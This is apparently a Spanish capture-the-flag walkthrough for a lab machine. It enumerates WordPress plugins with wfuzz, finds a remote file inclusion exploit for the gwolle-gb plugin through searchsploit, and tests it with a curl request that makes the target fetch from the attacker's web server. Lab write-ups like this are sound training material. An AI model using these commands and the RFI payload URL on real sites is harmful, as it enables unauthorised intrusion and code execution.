## Vulnerability Assessment {-}

### Buscando vulnerabilidades {-}

Muchas vulnerabilidades en Wordpress se encuentran buscando los plugins installados. Para enumerrar los plugins installados
en wordpress, se puede fuzzear la web con el uso de un diccionario especial de SecList.

```bash
git clone https://github.com/danielmiessler/SecLists
cd SecLists
cd Discovery/Web-Content/CMS/
```

Con **WFUZZ** utilizamos el dictionario de SecList llamado `wp-plugins.fuzz.txt`.

```bash
wfuzz -c -t 200 --hc=404 -w wp-plugins.fuzz.txt http://10.10.10.88/webservices/wp/FUZZ
```

Encontramos un plugin que se llama `gwolle-gb`

Por la web intentamos ver `http://tartartsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/` y no se ve nada. Pero como no nos
da un NotFound quiere decir que existe. Vamos buscando a ver si encontramos un exploit para este plugin


### Buscando un exploit con searchslpoit {-}

```bash
searchsploit gwolle
```

Aqui vemos que existe un exploit para Gwolle que no permitte hacer Remote File Inclusion. Analizamos el exploit para saber lo que se puede hacer.

```bash
searchsploit -x 38861
```

Podemos ver que un parametro GET llamado **abspath** que no esta sanitizado correctamente antes de estar utilizado por la funccion require de PHP.
Un attackante podria incluir de manera remota un fichero llamado `wp-load.php` para ejecutar su contenido el la web vulnerable. Ademas el exploit 
nos muestra sobre que routa tendriamos que ejecutar un methodo get para ejecutar el commando

`http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]`

La idea aqui seria de comprobar si esto es verdad.

### Comprobamos la effectividad del exploit {-}

1. Montamos un servidor web en la maquina de attackante

    ```bash
    python3 -m http.server
    ```

1. Lanzamos una peticion GET sobre el url que el exploit nos da

    ```bash
    curl -s -X GET "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/"
    ```

Aqui podemos comprobar que la maquina victima no esta enviando una peticion get a nuestro servidor web creado en python. A demas se puede ver que
la maquina victima esta intentando buscar un fichero `wp-load.php` que por el momento no existe.

